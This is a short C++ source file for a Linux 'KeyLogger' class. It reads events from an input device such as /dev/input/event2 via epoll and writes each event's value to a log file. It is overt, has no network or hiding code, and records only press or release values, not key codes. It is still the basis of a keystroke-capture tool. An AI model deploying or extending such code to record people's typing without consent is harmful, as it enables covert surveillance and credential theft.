
#ifndef KEY_LOGGER_CPP
#define KEY_LOGGER_CPP

#include "KeyLogger.h"

KeyLogger::KeyLogger(int argc, char **argv)
{
	if(argc != 3)
        {
		std::cout << "Usage: " << argv[0] << " /dev/input/event2 logger_output.txt" << std::endl;
		
		exit(1);	
      	}

    	if((mFd = open(argv[1], O_RDONLY | O_NOCTTY)) < 0)
      	{
		std::cout << strerror(errno) << std::endl;

		exit(1);
      	}

    	if(!(mFile = fopen(argv[2], "w")))
      	{
		std::cout << strerror(errno) << std::endl;

		exit(1);
      	}

    	if((mEfd = epoll_create(sizeof(mFd))) < 0)
      	{
		std::cout << strerror(errno) << std::endl;

		exit(1);
      	}

    	mEpollEvent.events = EPOLLIN;
    
	if((mCfg = epoll_ctl(mEfd, EPOLL_CTL_ADD, mFd, &mEpollEvent)) < 0)
      	{
	        std::cout << strerror(errno) << std::endl;

		exit(1);
      	}
}


KeyLogger::~KeyLogger()
{
	close(mEfd);
    	close(mFd);

    	fclose(mFile);

	mFile        = NULL;
	mEpollEvents = NULL;
}


void KeyLogger::log()
{   		
	while(true)
	{
		mRet = epoll_wait(mEfd, &mEpollEvent, EVENT_MAXIMUM, -1);
	
		if(mRet < 0)
		{
	  		std::cout << strerror(errno) << std::endl;
		}	

		if(read(mFd, &mInputEvent, sizeof(mInputEvent)) < 0)
	  	{
	    		std::cout << strerror(errno) << std::endl;

	    		exit(1);
	  	}

		if(fprintf(mFile, "%d\n", mInputEvent.value) < 0)
	  	{
	    		std::cout << strerror(errno) << std::endl;

	    		exit(1);
	  	}
				
		fflush(mFile);
	}
}

#endif
